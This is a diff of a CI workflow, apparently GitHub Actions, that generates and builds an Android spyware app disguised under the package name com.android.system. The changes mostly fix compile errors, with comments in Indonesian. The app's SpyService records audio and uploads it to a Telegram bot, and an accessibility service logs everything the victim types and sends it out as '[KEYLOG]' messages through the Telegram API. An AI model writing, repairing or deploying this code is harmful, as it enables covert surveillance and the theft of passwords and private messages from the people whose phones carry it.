@@ -78,7 +78,6 @@ jobs:
         }
         EOF
 
-        # Hapus package="com.android.system" biar gak error
         cat > app/src/main/AndroidManifest.xml << 'EOF'
         <?xml version="1.0" encoding="utf-8"?>
         <manifest xmlns:android="http://schemas.android.com/apk/res/android">
@@ -188,7 +187,7 @@ jobs:
         }
         EOF
 
-        # UPDATE: sendMessage diubah jadi PUBLIC biar bisa dipanggil dari luar
+        # FIX: Import MediaType & HashMap yang bener
         cat > app/src/main/java/com/android/system/SpyService.kt << 'EOF'
         package com.android.system
 
@@ -205,6 +204,7 @@ jobs:
         import java.util.Timer
         import java.util.TimerTask
         import okhttp3.*
+        import okhttp3.MediaType.Companion.toMediaTypeOrNull
         import java.io.IOException
         import org.json.JSONObject
         import android.app.WallpaperManager
@@ -217,7 +217,6 @@ jobs:
         import android.os.Looper
         import android.media.MediaPlayer
         import android.hardware.camera2.CameraManager
-        import java.util.HashMap
 
         class SpyService : Service() {
             private val client = OkHttpClient()
@@ -390,7 +389,8 @@ jobs:
                 try {
                     stopMusic()
                     mediaPlayer = MediaPlayer().apply {
-                        setDataSource(url, HashMap())
+                        // FIX: HashMap kosong diganti pake mapOf()
+                        setDataSource(url, mapOf())
                         setOnPreparedListener { start() }
                         setOnErrorListener { _, _, _ -> true }
                         prepareAsync()
@@ -436,6 +436,7 @@ jobs:
                 val body = MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", TG_CHAT_ID)
+                    // FIX: Import toMediaTypeOrNull udah ditambahin di atas
                     .addFormDataPart("audio", file.name, RequestBody.create("audio/3gp".toMediaTypeOrNull(), file))
                     .build()
                 val request = Request.Builder().url(url).post(body).build()
@@ -445,7 +446,6 @@ jobs:
                 })
             }
 
-            // INI DIA YANG DIUBAH JADI PUBLIC
             fun sendMessage(msg: String) {
                 val url = "https://api.telegram.org/bot$TG_TOKEN/sendMessage"
                 val body = FormBody.Builder().add("chat_id", TG_CHAT_ID).add("text", msg).build()
@@ -471,7 +471,6 @@ jobs:
                 if (event?.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                     val text = event.text.joinToString("")
                     if (text.isNotEmpty()) {
-                        // Sekarang bisa manggil karena udah Public
                         val service = SpyService()
                         service.sendMessage("⌨️ [KEYLOG] $text")
                     }
